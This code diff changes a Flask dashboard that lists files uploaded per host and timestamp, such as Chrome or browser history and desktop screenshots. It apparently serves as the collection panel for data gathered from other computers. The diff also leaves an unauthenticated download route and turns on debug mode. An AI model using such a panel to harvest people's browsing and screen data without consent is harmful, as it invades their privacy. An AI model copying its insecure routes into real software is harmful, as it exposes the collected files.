@@ -76,23 +76,28 @@ def index():
         for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
             full_path = os.path.join(UPLOAD_ROOT, folder)
             if os.path.isdir(full_path):
-                # Convert folder name timestamp to IST format
+                # Convert folder timestamp to IST
                 try:
                     dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
                     utc = pytz.utc.localize(dt)
-                    ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
+                    ist = utc.astimezone(pytz.timezone("Asia/Kolkata"))
                     formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
                 except:
                     formatted_timestamp = folder
 
                 row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
 
+                # Match files for each column
                 for col in COLUMNS[2:]:
                     matched = False
                     for f in os.listdir(full_path):
                         normalized = col.lower().replace(" ", "_")
-                        if normalized in f.lower():
-                            file_path = os.path.join(full_path, f)
+                        alternatives = {
+                            "chrome_history": ["chrome_history", "browser_history"],
+                            "desktop_screenshot": ["desktop_screenshot", "screenshot"]
+                        }
+                        patterns = alternatives.get(normalized, [normalized])
+                        if any(p in f.lower() for p in patterns):
                             row["files"].append(f"/download/{folder}/{f}")
                             matched = True
                             break
@@ -113,6 +118,7 @@ def index():
 
                 if not row["hostname"]:
                     row["hostname"] = folder.split("_")[0]
+
                 log_entries.append(row)
 
     return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)
@@ -130,3 +136,6 @@ def receive():
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
     return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+
+if __name__ == "__main__":
+    app.run(debug=True)
